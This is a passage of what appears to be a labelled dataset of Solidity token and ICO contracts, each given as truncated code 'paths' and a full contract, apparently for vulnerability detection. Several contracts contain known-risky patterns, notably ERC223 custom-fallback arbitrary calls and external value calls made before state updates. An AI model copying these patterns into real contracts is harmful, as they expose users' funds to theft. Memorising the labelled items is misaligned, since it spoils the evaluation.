function totalSupply() public\tview returns(uint256) { return _totalSupply; } function () external payable { buyTokens(msg.sender); } function buyTokens(address _beneficiary) public payable { uint256 weiAmount = msg.value; _preValidatePurchase(_beneficiary, weiAmount); uint256 tokens = _getTokenAmount(weiAmount); require(balances[this] > tokens); totalWeiRaised = totalWeiRaised.add(weiAmount); tokensSold = tokensSold.add(tokens); _processPurchase(_beneficiary, tokens); emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens); _processBonus(_beneficiary, tokens); _updatePurchasingState(_beneficiary, weiAmount); _forwardFunds(); _postValidatePurchase(_beneficiary, weiAmount); } function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal view { require(_beneficiary != address(0)); require(_weiAmount >= min_contribution); require(!crowdsaleClosed && block.timestamp >= start && block.timestamp <= end); } function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal pure { } function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal { this.transfer(_beneficiary, _tokenAmount); } function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal { _deliverTokens(_beneficiary, _tokenAmount); } function _processBonus(address _beneficiary, uint256 _tokenAmount) internal { uint256 bonusTokens = bonusScheme.getBonusTokens(_tokenAmount); if (balances[bonusScheme] < bonusTokens) { bonusTokens = balances[bonusScheme]; } if (bonusTokens > 0) { balances[bonusScheme] = balances[bonusScheme].sub(bonusTokens); balances[_beneficiary] = balances[_beneficiary].add(bonusTokens); emit Transfer(address(bonusScheme), _beneficiary, bonusTokens); emit BonusSent(address(bonusScheme), _beneficiary, _tokenAmount, bonusTokens); tokensSold = tokensSold.add(bonusTokens); } } function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal { } function _getTokenAmount(uint256 _weiAmount) internal view returns(uint256) { _weiAmount = _weiAmount.mul(ethRate); return _weiAmount.div(10 ** uint(18 - _decimals)); } function _forwardFunds()internal { vault.deposit.value(msg.value)(msg.sender); } function transfer(address _to, uint256 _value) public returns(bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns(uint256 balance) { return balances[_owner]; } function transferFrom(address _from, address _to, uint256 _value) public returns(bool) { require(_to != address(0)); require(!frozenAccount[_from]); require(!frozenAccount[_to]); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value)public returns(bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns(uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns(bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns(bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = SafeMath.sub(oldValue, _subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) { require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); if (isContract(_to)) { return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint _value, bytes _data) public returns(bool) { require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); if (isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function isContract(address _addr) private view returns(bool is_contract) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } function transferToAddress(address _to, uint _value, bytes _data) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint _value, bytes _data) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.tokenFallback(msg.sender, _value, _data); emit Transfer(msg.sender, _to, _value, _data); return true; } function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); emit Transfer(msg.sender, _to, _value, _data); return true; } function setPreICOSoldAmount(uint256 _soldTokens, uint256 _raisedWei) onlyOwner beforeICO public { tokensSold = tokensSold.add(_soldTokens); totalWeiRaised = totalWeiRaised.add(_raisedWei); } function freezeAccount(address target, bool freeze) onlyOwner public { frozenAccount[target] = freeze; emit FrozenFunds(target, freeze); } function burn(uint256 _value) onlyOwner public returns(bool success) { require(balances[msg.sender] >= _value); balances[msg.sender] = balances[msg.sender].sub(_value); _totalSupply = _totalSupply.sub(_value); emit Burn(msg.sender, _value); emit Transfer(msg.sender, address(0), _value); return true; } function withdrawTokens() onlyOwner public returns(bool) { require(this.transfer(owner, balances[this])); uint256 bonusTokens = balances[address(bonusScheme)]; balances[address(bonusScheme)] = 0; if (bonusTokens > 0) { balances[owner] = balances[owner].add(bonusTokens); emit Transfer(address(bonusScheme), owner, bonusTokens); } return true; } function transferAnyERC20Token(address _tokenAddress, uint256 _amount) onlyOwner public returns(bool success) { return ERC20(_tokenAddress).transfer(owner, _amount); } function claimRefund() public { require(crowdsaleClosed); require(!goalReached()); vault.refund(msg.sender); } function goalReached() public view returns(bool) { return tokensSold >= softCap; } function finalization() internal { if (goalReached()) { vault.close(); } else { vault.enableRefunds(); } } function finalize() onlyOwner afterDeadline public { require(!crowdsaleClosed); finalization(); emit Finalized(); withdrawTokens(); crowdsaleClosed = true; } } "}
{"sol name": "29601.sol", "label": 0, "first path": "function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) { bool status = super.transferInternal(from, to, value); if (status) { if (isContract(to)) { ContractReceiver receiver = ContractReceiver(to); if (useCustomFallback) { require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true); } else { receiver.tokenFallback(from, value, data); Transfer(from, to, value, data); return status; function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) { require(locked == false); bool status = transferInternal(msg.sender, to, value, data, true, customFallback); return status; function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) { return transferInternal(from, to, value, data, false, \"\"); function transferInternal(address from, address to, uint256 value) internal returns (bool success) { require(locked == false); bytes memory data; return transferInternal(from, to, value, data, false, \"\"); function claimableTransfer( uint256 _time, address _from, address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback ) internal returns (bool success) uint256 senderCurrentBalance = balanceOf(_from); uint256 receiverCurrentBalance = balanceOf(_to); uint256 _totalSupply = totalSupply(); bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback); require(status); claimInternal(_time, _from, senderCurrentBalance, _totalSupply); claimInternal(_time, _to, receiverCurrentBalance, _totalSupply); return true; ", "second path": "function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) { bool status = super.transferInternal(from, to, value); if (status) { if (isContract(to)) { ContractReceiver receiver = ContractReceiver(to); if (useCustomFallback) { require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true); } else { receiver.tokenFallback(from, value, data); Transfer(from, to, value, data); return status; function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) { require(locked == false); bool status = transferInternal(msg.sender, to, value, data, true, customFallback); return status; function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) { return transferInternal(from, to, value, data, false, \"\"); function transferInternal(address from, address to, uint256 value) internal returns (bool success) { require(locked == false); bytes memory data; return transferInternal(from, to, value, data, false, \"\"); function claimableTransfer( uint256 _time, address _from, address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback ) internal returns (bool success) uint256 senderCurrentBalance = balanceOf(_from); uint256 receiverCurrentBalance = balanceOf(_to); uint256 _totalSupply = totalSupply(); bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback); require(status); claimInternal(_time, _from, senderCurrentBalance, _totalSupply); claimInternal(_time, _to, receiverCurrentBalance, _totalSupply); return true; ", "third path": "function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) { bool status = super.transferInternal(from, to, value); if (status) { if (isContract(to)) { ContractReceiver receiver = ContractReceiver(to); if (useCustomFallback) { require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true); } else { receiver.tokenFallback(from, value, data); Transfer(from, to, value, data); return status; function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) { require(locked == false); bool status = transferInternal(msg.sender, to, value, data, true, customFallback); return status; function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) { return transferInternal(from, to, value, data, false, \"\"); function transferInternal(address from, address to, uint256 value) internal returns (bool success) { require(locked == false); bytes memory data; return transferInternal(from, to, value, data, false, \"\"); function claimableTransfer( uint256 _time, address _from, address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback ) internal returns (bool success) uint256 senderCurrentBalance = balanceOf(_from); uint256 receiverCurrentBalance = balanceOf(_to); uint256 _totalSupply = totalSupply(); bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback); require(status); claimInternal(_time, _from, senderCurrentBalance, _totalSupply); claimInternal(_time, _to, receiverCurrentBalance, _totalSupply); return true; ", "long path": "pragma solidity ^0.4.15; contract Ownable { address public owner; address public newOwner; modifier onlyOwner() { require(msg.sender == owner); _; } function Ownable() public { owner = msg.sender; } function transferOwnership(address _newOwner) public onlyOwner { require(_newOwner != address(0)); newOwner = _newOwner; } function acceptOwnership() public { if (msg.sender == newOwner) { owner = newOwner; newOwner = address(0); } } } library SafeMath { function mul(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal constant returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract TokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; } contract ERC20 is Ownable { using SafeMath for uint256; uint256 public initialSupply; uint256 public creationBlock; uint8 public decimals; string public name; string public symbol; string public standard; bool public locked; bool public transferFrozen; mapping (address => uint256) public balances; mapping (address => mapping (address => uint256)) public allowed; event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed _owner, address indexed _spender, uint _value); modifier onlyPayloadSize(uint _numwords) { assert(msg.data.length == _numwords * 32 + 4); _; } function ERC20( uint256 _initialSupply, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, bool _transferAllSupplyToOwner, bool _locked ) public { standard = \"ERC20 0.1\"; initialSupply = _initialSupply; if (_transferAllSupplyToOwner) { setBalance(msg.sender, initialSupply); } else { setBalance(this, initialSupply); } name = _tokenName; symbol = _tokenSymbol; decimals = _decimalUnits; locked = _locked; creationBlock = block.number; } function transfer(address _to, uint256 _value) public onlyPayloadSize(2) returns (bool) { require(locked == false); require(transferFrozen == false); bool status = transferInternal(msg.sender, _to, _value); require(status == true); return true; } function approve(address _spender, uint256 _value) public returns (bool success) { if (locked) { return false; } allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) { if (locked) { return false; } TokenRecipient spender = TokenRecipient(_spender); if (approve(_spender, _value)) { spender.receiveApproval(msg.sender, _value, this, _extraData); return true; } } function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3) returns (bool success) { if (locked) { return false; } if (transferFrozen) { return false; } if (allowed[_from][msg.sender] < _value) { return false; } bool _success = transferInternal(_from, _to, _value); if (_success) { allowed[_from][msg.sender] -= _value; } return _success; } function totalSupply() public constant returns (uint256) { return initialSupply; } function balanceOf(address _address) public constant returns (uint256 balance) { return balances[_address]; } function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { return allowed[_owner][_spender]; } function setBalance(address _holder, uint256 _amount) internal { balances[_holder] = _amount; } function transferInternal(address _from, address _to, uint256 _value) internal returns (bool success) { require(locked == false); require(transferFrozen == false); if (_value == 0) { Transfer(_from, _to, _value); return true; } if (balances[_from] < _value) { return false; } setBalance(_from, balances[_from].sub(_value)); setBalance(_to, balances[_to].add(_value)); Transfer(_from, _to, _value); return true; } } contract ERC223 { event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); function transfer(address to, uint value, bytes data) public returns (bool ok); function transfer(address to, uint value, bytes data, string customFallback) public returns (bool ok); } contract ContractReceiver { function tokenFallback(address _from, uint _value, bytes _data) public; } contract ERC223Token is ERC223, ERC20 { function ERC223Token( uint256 _initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol, bool transferAllSupplyToOwner, bool _locked ) public ERC20(_initialSupply, tokenName, decimalUnits, tokenSymbol, transferAllSupplyToOwner, _locked) { } function transfer(address to, uint256 value, bytes data) public returns (bool success) { require(locked == false); bool status = transferInternal(msg.sender, to, value, data); return status; } function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) { require(locked == false); bool status = transferInternal(msg.sender, to, value, data, true, customFallback); return status; } function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3) returns (bool success) { if (locked) { return false; } if (transferFrozen) { return false; } if (allowed[_from][msg.sender] < _value) { return false; } bool _success = super.transferInternal(_from, _to, _value); if (_success) { allowed[_from][msg.sender] -= _value; } return _success; } function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) { return transferInternal(from, to, value, data, false, \"\"); } function transferInternal(address from, address to, uint256 value, bytes data,  bool useCustomFallback, string customFallback )  internal returns (bool success) { bool status = super.transferInternal(from, to, value); if (status) { if (isContract(to)) { ContractReceiver receiver = ContractReceiver(to); if (useCustomFallback) { require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true); } else { receiver.tokenFallback(from, value, data); } } Transfer(from, to, value, data); } return status; } function transferInternal(address from, address to, uint256 value) internal returns (bool success) { require(locked == false); bytes memory data; return transferInternal(from, to, value, data, false, \"\"); } function isContract(address _addr) private returns (bool) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } } contract MintingERC20 is ERC223Token { using SafeMath for uint256; uint256 public maxSupply; mapping (address => bool) public minters; modifier onlyMinters () { require(true == minters[msg.sender]); _; } function MintingERC20( uint256 _initialSupply, uint256 _maxSupply, string _tokenName, uint8 _decimals, string _symbol, bool _transferAllSupplyToOwner, bool _locked ) ERC223Token(_initialSupply, _tokenName, _decimals, _symbol, _transferAllSupplyToOwner, _locked) { minters[msg.sender] = true; maxSupply = _maxSupply; } function addMinter(address _newMinter) public onlyOwner { minters[_newMinter] = true; } function removeMinter(address _minter) public onlyOwner { minters[_minter] = false; } function mint(address _addr, uint256 _amount) public onlyMinters returns (uint256) { return internalMint(_addr, _amount); } function internalMint(address _addr, uint256 _amount) internal returns (uint256) { if (_amount == uint256(0)) { return uint256(0); } if (totalSupply().add(_amount) > maxSupply) { return uint256(0); } initialSupply = initialSupply.add(_amount); balances[_addr] = balances[_addr].add(_amount); Transfer(0, _addr, _amount); return _amount; } } contract AbstractClaimableToken { function claimedTokens(address _holder, uint256 _tokens) public; } contract GenesisToken is MintingERC20 { using SafeMath for uint256; uint256 public emitTokensSince; TokenEmission[] public emissions; mapping(address => uint256) public lastClaims; struct TokenEmission { uint256 blockDuration; uint256 blockTokens; uint256 periodEndsAt; bool removed; } event ClaimedTokens(address _holder, uint256 _since, uint256 _till, uint256 _tokens); function GenesisToken( uint256 _totalSupply, uint8 _precision, string _name, string _symbol, bool _transferAllSupplyToOwner, bool _locked, uint256 _emitTokensSince, uint256 _maxSupply ) public MintingERC20(_totalSupply, _maxSupply, _name, _precision, _symbol, _transferAllSupplyToOwner, _locked) { standard = \"GenesisToken 0.1\"; emitTokensSince = _emitTokensSince; } function addTokenEmission(uint256 _blockDuration, uint256 _blockTokens, uint256 _periodEndsAt) public onlyOwner { emissions.push(TokenEmission(_blockDuration, _blockTokens, _periodEndsAt, false)); } function removeTokenEmission(uint256 _i) public onlyOwner { require(_i < emissions.length); emissions[_i].removed = true; } function updateTokenEmission(uint256 _i, uint256 _blockDuration, uint256 _blockTokens, uint256 _periodEndsAt) public onlyOwner { require(_i < emissions.length); emissions[_i].blockDuration = _blockDuration; emissions[_i].blockTokens = _blockTokens; emissions[_i].periodEndsAt = _periodEndsAt; } function claim() public returns (uint256) { require(false == locked); uint256 currentBalance = balanceOf(msg.sender); uint256 currentTotalSupply = totalSupply(); return claimInternal(block.timestamp, msg.sender, currentBalance, currentTotalSupply); } function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { return claimableTransferFrom(block.timestamp, _from, _to, _value); } function calculateEmissionTokens( uint256 _lastClaimedAt, uint256 _currentTime, uint256 _currentBalance, uint256 _totalSupply ) public constant returns (uint256 tokens) { uint256 totalTokens = 0; uint256 newCurrentTime = _lastClaimedAt; uint256 remainingSeconds = _currentTime.sub(_lastClaimedAt); uint256 collectedTokensPerPeriod; for (uint256 i = 0; i < emissions.length; i++) { TokenEmission storage emission = emissions[i]; if (emission.removed) { continue; } if (newCurrentTime < emission.periodEndsAt) { if (newCurrentTime.add(remainingSeconds) > emission.periodEndsAt) { uint256 diff = emission.periodEndsAt.sub(newCurrentTime); collectedTokensPerPeriod = getPeriodMinedTokens( diff, _currentBalance, emission.blockDuration, emission.blockTokens, _totalSupply); totalTokens += collectedTokensPerPeriod; newCurrentTime += diff; remainingSeconds -= diff; } else { collectedTokensPerPeriod = getPeriodMinedTokens( remainingSeconds, _currentBalance, emission.blockDuration, emission.blockTokens, _totalSupply ); totalTokens += collectedTokensPerPeriod; newCurrentTime += remainingSeconds; remainingSeconds = 0; } } if (remainingSeconds == 0) { break; } } return totalTokens; } function getPeriodMinedTokens( uint256 _duration, uint256 _balance, uint256 _blockDuration, uint256 _blockTokens, uint256 ) internal returns (uint256) { uint256 blocks = _duration.div(_blockDuration); return blocks.mul(_blockTokens).mul(_balance).div(maxSupply); } function tokensClaimedHook(address _holder, uint256 _since, uint256 _till, uint256 _tokens) internal { ClaimedTokens(_holder, _since, _till, _tokens); } function claimInternal( uint256 _time, address _address, uint256 _currentBalance, uint256 _currentTotalSupply ) internal returns (uint256) { if (_time < emitTokensSince) { lastClaims[_address] = emitTokensSince; return 0; } if (_currentBalance == 0) { lastClaims[_address] = _time; return 0; } uint256 lastClaimAt = lastClaims[_address]; if (lastClaimAt == 0) { lastClaims[_address] = emitTokensSince; lastClaimAt = emitTokensSince; } if (lastClaimAt >= _time) { return 0; } uint256 tokens = calculateEmissionTokens(lastClaimAt, _time, _currentBalance, _currentTotalSupply); if (tokens > 0) { tokensClaimedHook(_address, lastClaimAt, _time, tokens); lastClaims[_address] = _time; return tokens; } return 0; } function claimableTransfer( uint256 _time, address _from, address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback ) internal returns (bool success) { uint256 senderCurrentBalance = balanceOf(_from); uint256 receiverCurrentBalance = balanceOf(_to); uint256 _totalSupply = totalSupply(); bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback); require(status); claimInternal(_time, _from, senderCurrentBalance, _totalSupply); claimInternal(_time, _to, receiverCurrentBalance, _totalSupply); return true; } function transferInternal(address _from, address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success) { return claimableTransfer(block.timestamp, _from, _to, _value, _data, _useCustomFallback, _customFallback); } function claimableTransferFrom( uint256 _time, address _from, address _to, uint256 _value ) internal returns (bool success) { uint256 senderCurrentBalance = balanceOf(_from); uint256 receiverCurrentBalance = balanceOf(_to); uint256 _totalSupply = totalSupply(); bool status = super.transferFrom(_from, _to, _value); if (status) { claimInternal(_time, _from, senderCurrentBalance, _totalSupply); claimInternal(_time, _to, receiverCurrentBalance, _totalSupply); } return status; } function internalMint(address _addr, uint256 _amount) internal returns (uint256) { claimInternal(now, _addr, balanceOf(_addr), totalSupply()); uint256 minted = super.internalMint(_addr, _amount); return minted; } } contract CLC is MintingERC20, AbstractClaimableToken { uint256 public createdAt; Clout public genesisToken; function CLC(uint256 _maxSupply, uint8 decimals, Clout _genesisToken, bool transferAllSupplyToOwner) public MintingERC20(0, _maxSupply, \"CLC\", decimals, \"CLC\", transferAllSupplyToOwner, false) { createdAt = now; standard = \"CLC 0.1\"; genesisToken = _genesisToken; } function claimedTokens(address _holder, uint256 _tokens) public { require(msg.sender == address(genesisToken)); uint256 minted = internalMint(_holder, _tokens); require(minted == _tokens); } function setGenesisToken(Clout _genesisToken) public onlyOwner { genesisToken = _genesisToken; } function setTransferFrozen(bool _frozen) public onlyOwner { transferFrozen = _frozen; } function setLocked(bool _locked) public onlyOwner { locked = _locked; } } contract Clout is GenesisToken { AbstractClaimableToken public claimableToken; uint256 public createdAt; mapping (address => bool) public issuers; function Clout(uint256 emitTokensSince, bool init, uint256 initialSupply, uint8 decimals, string tokenName, string tokenSymbol, bool transferAllSupplyToOwner ) public GenesisToken( 0, decimals, tokenName, tokenSymbol, transferAllSupplyToOwner, false, emitTokensSince, initialSupply ) { standard = \"Clout 0.1\"; createdAt = now; if (init) { uint256 blockDuration = 15; emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((1514764800 - emitTokensSince) / blockDuration), 1514764800, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((1577836800 - 1514764800) / blockDuration), 1577836800, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((1672531200 - 1577836800) / blockDuration), 1672531200, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((1798761600 - 1672531200) / blockDuration), 1798761600, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((1956528000 - 1798761600) / blockDuration), 1956528000, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((2145916800 - 1956528000) / blockDuration), 2145916800, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((2366841600 - 2145916800) / blockDuration), 2366841600, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((2619302400 - 2366841600) / blockDuration), 2619302400, false ) ); emissions.push( TokenEmission( blockDuration, 100000000 * 10 ** 18 / ((2903299200 - 2619302400) / blockDuration), 2903299200, false ) ); } } function setEmissions(uint256[] array) public onlyOwner { require(array.length % 4 == 0); delete emissions; for (uint256 i = 0; i < array.length; i += 4) { emissions.push(TokenEmission(array[i], array[i + 1], array[i + 2], array[i + 3] == 0 ? false : true)); } } function setClaimableToken(AbstractClaimableToken _token) public onlyOwner { claimableToken = _token; } function setTransferFrozen(bool _frozen) public onlyOwner { transferFrozen = _frozen; } function setLocked(bool _locked) public onlyOwner { locked = _locked; } function tokensClaimedHook(address _holder, uint256 since, uint256 till, uint256 amount) internal { if (claimableToken != address(0)) { claimableToken.claimedTokens(_holder, amount); } ClaimedTokens(_holder, since, till, amount); } } contract Multivest is Ownable { mapping (address => bool) public allowedMultivests; event MultivestSet(address multivest); event MultivestUnset(address multivest); event Contribution(address _holder, uint256 value, uint256 tokens); modifier onlyAllowedMultivests() { require(true == allowedMultivests[msg.sender]); _; } function Multivest(address multivest) { allowedMultivests[multivest] = true; } function setAllowedMultivest(address _address) public onlyOwner { allowedMultivests[_address] = true; } function unsetAllowedMultivest(address _address) public onlyOwner { allowedMultivests[_address] = false; } function multivestBuy( address _holder, uint256 _value ) public onlyAllowedMultivests { bool status = buy(_holder, block.timestamp, _value); require(status == true); } function multivestBuy( bytes32 _hash, uint8 _v, bytes32 _r, bytes32 _s ) public payable { require(_hash == keccak256(msg.sender)); require(allowedMultivests[verify(_hash, _v, _r, _s)] == true); bool status = buy(msg.sender, block.timestamp, msg.value); require(status == true); } function verify(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public constant returns (address) { bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\"; return ecrecover(keccak256(prefix, hash), v, r, s); } function buy(address _address, uint256 _time, uint256 _value) internal returns (bool); } contract ICO is Ownable, Multivest { uint256 public icoSince; uint256 public icoTill; uint8 public decimals; mapping(address => uint256) public holderEthers; uint256 public collectedEthers; uint256 public soldTokens; uint256 public minEthToContribute; Phase[] public phases; bool public locked; Clout public clout; CLC public clc; address[] public etherReceivers; address public etherMasterWallet; struct Phase { uint256 price; uint256 maxAmount; } event Contribution(address _holder, uint256 _ethers, uint256 _clouts, uint256 _clcs); function ICO( uint256 _icoSince, uint256 _icoTill, uint8 _decimals, uint256 price1, uint256 price2, uint256 price3, Clout _clout, CLC _clc, uint256 _minEthToContribute, bool _locked ) public Multivest(msg.sender) { icoSince = _icoSince; icoTill = _icoTill; decimals = _decimals; locked = _locked; clout = _clout; clc = _clc; if (_minEthToContribute > 0) { minEthToContribute = _minEthToContribute; } else { minEthToContribute = 0; } phases.push(Phase(price1, 5000000 * (uint256(10) ** decimals))); phases.push(Phase(price2, 3000000 * (uint256(10) ** decimals))); phases.push(Phase(price3, 2000000 * (uint256(10) ** decimals))); } function () payable { bool status = buy(msg.sender, block.timestamp, msg.value); require(status == true); } function setEtherReceivers( address _masterWallet, address[] _etherReceivers ) public onlyOwner { require(_masterWallet != address(0)); require(_etherReceivers.length == 4); require(_etherReceivers[0] != address(0)); require(_etherReceivers[1] != address(0)); require(_etherReceivers[2] != address(0)); require(_etherReceivers[3] != address(0)); etherMasterWallet = _masterWallet; etherReceivers = _etherReceivers; } function setPrice(uint256 price1, uint256 price2, uint256 price3) public onlyOwner { phases[0].price = price1; phases[1].price = price2; phases[2].price = price3; } function setPeriod(uint256 since, uint256 till) public onlyOwner { icoSince = since; icoTill = till; } function setClout(Clout _clout) public onlyOwner { clout = _clout; } function setCLC(CLC _clc) public onlyOwner { clc = _clc; } function setLocked(bool _locked) public onlyOwner { locked = _locked; } function getIcoTokensAmount(uint256 _soldTokens, uint256 _value) public constant returns (uint256) { uint256 amount; uint256 newSoldTokens = _soldTokens; uint256 remainingValue = _value; for (uint i = 0; i < phases.length; i++) { Phase storage phase = phases[i]; uint256 tokens = remainingValue * (uint256(10) ** decimals) / phase.price; if (phase.maxAmount > newSoldTokens) { if (newSoldTokens + tokens > phase.maxAmount) { uint256 diff = phase.maxAmount - tokens; amount += diff; uint256 phaseEthers = diff * phase.price / (uint256(10) ** decimals); remainingValue -= phaseEthers; newSoldTokens += (phaseEthers * (uint256(10) ** decimals) / phase.price); } else { amount += tokens; newSoldTokens += tokens; remainingValue = 0; } } if (remainingValue == 0) { break; } } if (remainingValue > 0) { return 0; } return amount; } function transferEthers() public onlyOwner { require(this.balance > 0); require(etherReceivers.length == 4); require(etherMasterWallet != address(0)); if (this.balance > 0) { uint256 balance = this.balance; etherReceivers[0].transfer(balance * 15 / 100); etherReceivers[1].transfer(balance * 15 / 100); etherReceivers[2].transfer(balance * 10 / 100); etherReceivers[3].transfer(balance * 10 / 100); etherMasterWallet.transfer(this.balance); } } function buy(address _address, uint256 _time, uint256 _value) internal returns (bool) { if (locked == true) { return false; } if (_time < icoSince) { return false; } if (_time > icoTill) { return false; } if (_value < minEthToContribute || _value == 0) { return false; } uint256 amount = getIcoTokensAmount(soldTokens, _value); if (amount == 0) { return false; } uint256 cloutMinted = clout.mint(_address, amount); uint256 clcMinted = clc.mint(_address, amount); require(cloutMinted == amount); require(clcMinted == amount); soldTokens += amount; collectedEthers += _value; holderEthers[_address] += _value; Contribution(_address, _value, amount, amount); return true; } } "}
{"sol name": "38724.sol", "label": 1, "first path": "function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; contract ERC20nator is StandardToken, Ownable { address public fundraiserAddress; bytes public fundraiserCallData; uint constant issueFeePercent = 2; event requestedRedeem(address indexed requestor, uint amount); event redeemed(address redeemer, uint amount); function() payable { uint issuedTokens = msg.value * (100 - issueFeePercent) / 100; if(!owner.send(msg.value - issuedTokens)) throw; if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw; totalSupply += issuedTokens; balances[msg.sender] += issuedTokens; ", "second path": "function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; contract ERC20nator is StandardToken, Ownable { address public fundraiserAddress; bytes public fundraiserCallData; uint constant issueFeePercent = 2; event requestedRedeem(address indexed requestor, uint amount); event redeemed(address redeemer, uint amount); function() payable { uint issuedTokens = msg.value * (100 - issueFeePercent) / 100; if(!owner.send(msg.value - issuedTokens)) throw; if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw; totalSupply += issuedTokens; balances[msg.sender] += issuedTokens; ", "third path": "function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; contract ERC20nator is StandardToken, Ownable { address public fundraiserAddress; bytes public fundraiserCallData; uint constant 